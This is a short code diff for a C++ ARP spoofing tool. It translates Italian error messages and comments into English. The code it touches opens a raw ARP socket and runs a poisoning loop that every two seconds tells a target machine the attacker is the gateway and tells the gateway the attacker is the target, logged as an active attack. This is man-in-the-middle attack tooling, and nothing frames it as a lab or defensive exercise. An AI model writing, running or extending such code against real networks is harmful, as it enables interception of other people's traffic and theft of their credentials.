@@ -23,7 +23,7 @@ bool ArpSpoofer::initialize(const std::string &iface) {
     interface = iface;
     raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (raw_socket < 0) {
-        Utils::logError("Impossibile creare socket ARP");
+        Utils::logError("Unable to create ARP socket");
         return false;
     }
     return true;
@@ -71,12 +71,12 @@ void ArpSpoofer::poisonLoop(const std::string &target_ip, const std::string &gat
     std::string target_mac = "ff:ff:ff:ff:ff:ff"; // Broadcast, poi si aggiorna
     std::string gateway_mac = "ff:ff:ff:ff:ff:ff";
     
-    Utils::logAttack("ARP Spoofing attivo: " + target_ip + " <-> " + gateway_ip);
+    Utils::logAttack("ARP spoofing active: " + target_ip + " <-> " + gateway_ip);
     
     while (running) {
-        // Dici al target che sono il gateway
+        // Tell the target that I am the gateway
         sendArpPacket(gateway_ip, my_mac, target_ip, target_mac, true);
-        // Dici al gateway che sono il target
+        // Tell the gateway that I am the target
         sendArpPacket(target_ip, my_mac, gateway_ip, gateway_mac, true);
         
         sleep(2); // Keepalive ogni 2 secondi
